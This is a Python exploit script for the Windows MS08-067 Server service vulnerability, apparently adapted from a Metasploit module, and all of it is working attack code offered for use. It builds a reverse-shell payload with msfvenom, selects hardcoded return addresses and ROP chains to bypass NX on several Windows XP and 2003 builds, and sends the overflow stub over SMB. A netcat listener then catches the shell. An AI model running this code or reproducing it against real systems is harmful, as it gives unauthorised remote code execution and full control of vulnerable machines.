#!/usr/bin/python
###############################################################################################
#   MS08-067 Exploit - Auto Reverse NetCat Payload Mod by 3mrgnc3                             #
#   Designed for Kali Linux - msfvenom and nc required to function                            #
#   Based on Ported Exploit By EKOZ https://github.com/jivoi https://jivoi.github.io/         #
#   Modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).   #
#   The ret addr & ROP parts are ported from MSF Module exploit/windows/smb/ms08_067_netapi   #
###############################################################################################

import struct
import time
import sys
import subprocess   # Added to integrate msfvenom payload generation functionality
from threading import Thread    #Thread is imported incase you would like to modify

try:
    from impacket import smb
    from impacket import uuid
    from impacket import dcerpc
    from impacket.dcerpc.v5 import transport
except ImportError, _:
    print 'Install the following library to make this script work'
    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'
    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'
    sys.exit(1)

if __name__ == '__main__':
    try:
        target = sys.argv[1]
        os = sys.argv[2]
        lhost = sys.argv[3]
        lport = sys.argv[4]
    except IndexError:
        print ''
        print '   ____________________________________________'
        print '  |                                            |'
        print '  | MS08-067 Exploit - Auto NC mod by 3mrgnc3  |'
        print '  |    Based On Ported MSF Exploit By EKOZ     |'
        print '  |____________________________________________|'
        print '  |                                            |'
        print '  |                   USAGE                    |'
        print '  |  MS08-067.py <rhost> <os> <lhost> <lport>  |'
        print '  |   eg: MS08-067.py 10.1.1.1 3 10.2.2.2 53   |'
        print '  |____________________________________________|'
        print '  |                                            |'
        print '  |            TARGET OS SELECTION             |'
        print '  |  1 = Windows XP SP0/SP1 Universal          |'
        print '  |  2 = Windows 2000 Universal                |'
        print '  |  3 = Windows 2003 SP0 Universal            |'
        print '  |  4 = Windows 2003 SP1 English              |'
        print '  |  5 = Windows XP SP3 French (NX)            |'
        print '  |  6 = Windows XP SP3 English (NX)           |'
        print '  |  7 = Windows XP SP3 English (AlwaysOn NX)  |'
        print '  |____________________________________________|\r\n'
        sys.exit(-1)

#badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes
#EXITFUNC=thread Important!
# msfvenom -p windows/shell_reverse_tcp --nopsled=32 LHOST=10.11.0.225 LPORT=53  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
# Auto Generate Reverse Shell Payload Using msfvenom
mksh  = "msfvenom -p windows/shell_reverse_tcp"
mksh += " -b \'\\x00\\x0a\\x0d\\x5c\\x5f\\x2f\\x2e\\x40\'"
mksh += " -e x86/call4_dword_xor"
mksh += " EXITFUNC=thread"
mksh += " --nopsled=32"
mksh += " LHOST="+lhost
mksh += " LPORT="+lport
mksh += " -f python "
mksh += " -a x86"
mksh += " -o RevPld.py"

print '   ____________________________________________'
print '  |                                            |'
print '  | MS08-067 Exploit - Auto NC mod by 3mrgnc3  |'
print '  |    Based On Ported MSF Exploit By EKOZ     |'
print '  |____________________________________________|\r\n'
try:
    print "[+] Attempting To Generate Reverse Shell Payload ..."
    vnm = subprocess.Popen(mksh.split(), stdout=subprocess.PIPE)
    vnm.wait()
    print "[+] Reverse Shell Payload Generated Successfully..."
except:    
    print "[!] ERROR: Couldn't Generate Payload "
    sys.exit(-1)

from RevPld import buf

nops = "\x90"*30
nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000

def generate_rop(rvas):
    gadget1="\x90\x5a\x59\xc3"
    gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]
    gadget3="\xcc\x90\xeb\x5a"
    ret=struct.pack('<L', 0x00018000)
    ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
    ret+=struct.pack('<L', 0x01040110)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', 0x01010101)
    ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget1
    ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget2[0]
    ret+=gadget2[1]
    ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
    ret+=gadget2[2]
    ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
    ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
    ret+=struct.pack('<L', rvas['jmp eax']+module_base)
    ret+=gadget3
    return ret

class SRVSVC_Exploit(Thread):
    def __init__(self, target, os, port=445):
        super(SRVSVC_Exploit, self).__init__()
        self.__port = port
        self.target = target
        self.os = os

    def __DCEPacket(self):
        if (self.os=='1'):
            print '[+] Targeting : Windows XP SP0/SP1 Universal'
            ret = "\x61\x13\x00\x01"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='2'):
            print '[+] Targeting : Windows 2000 Universal'
            ret = "\xb0\x1c\x1f\x00"
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='3'):
            print '[+] Targeting : Windows 2003 SP0 Universal'
            ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
            jumper = nonxjmper % (ret, ret)
        elif (self.os=='4'):
            print '[+] Targeting : Windows 2003 SP1 English'
            ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
            ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
            jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
            disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
            jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
        elif (self.os=='5'):
            print '[+] Targeting : Windows XP SP3 French (NX)'
            ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07
            disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='6'):
            print '[+] Targeting : Windows XP SP3 English (NX)'
            ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07
            disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2
            jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
        elif (self.os=='7'):
            print '[+] Targeting : Windows XP SP3 English (AlwaysOn NX)'
            rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
            jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
        else:
            print '[+] OS Version Not Supported\n'
            sys.exit(-1)
        print '[+] Initiating Connection To '+target+":445"
        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)
        self.__trans.connect()
        self.__dce = self.__trans.DCERPC_class(self.__trans)
        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        path  ="\x5c\x00"+"ABCDEFGHIJ"*10 + nops + buf +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" 
        path += "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2
        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"
        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"
        return


    def run(self):
        self.__DCEPacket()
        self.__dce.call(0x1f, self.__stub)

current = SRVSVC_Exploit(target, os)
current.start()
lnr = "nc -s "+lhost+" -nvlp "+lport
try:
    ncl = subprocess.Popen(lnr, shell=True)
    ncl.poll()
    ncl.wait()
except:    
    print "\r[!] Shell Terminated!"
    
